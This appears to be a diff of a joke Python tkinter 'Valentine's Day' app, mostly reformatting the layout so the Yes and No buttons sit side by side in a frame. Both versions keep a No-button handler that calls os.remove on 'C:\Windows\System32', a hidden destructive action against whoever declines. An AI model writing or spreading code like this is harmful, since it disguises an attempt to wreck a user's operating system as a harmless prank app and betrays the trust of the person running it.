@@ -2,35 +2,36 @@ import tkinter as tk
 from PIL import Image, ImageTk
 import os
 
-
 def clickedYes():
-   yesLbl.pack()
+    yesLbl.pack()
 
 def clickedNo():
-   os.remove("C:\\Windows\\System32")
+    os.remove("C:\\Windows\\System32")
 
 window = tk.Tk()
 window.title("Valentine's Day")
-
 window.geometry('350x200')
 
 lbl = tk.Label(window, text="Will you be my valentine? <3")
-
 lbl.pack(pady=6)
-
-yesBtn = tk.Button(window, text="Yes", command=clickedYes)
-noBtn = tk.Button(window, text="No", command=clickedNo)
 
 image = Image.open("./milk.png")
 resize_img = image.resize((80, 80))
 img = ImageTk.PhotoImage(resize_img)
 
-yesLbl = tk.Label(window, text="Yay!!!")
 tk.Label(window, image=img).pack()
 
-yesBtn.pack()
-noBtn.pack()
+button_frame = tk.Frame(window)
+button_frame.pack()
+
+yesBtn = tk.Button(button_frame, text="Yes", command=clickedYes)
+noBtn = tk.Button(button_frame, text="No", command=clickedNo)
+
+
+
+yesLbl = tk.Label(window, text="Yay!!!")
+
+yesBtn.pack(side=tk.LEFT)
+noBtn.pack(side=tk.LEFT) 
 
 window.mainloop()
-
-
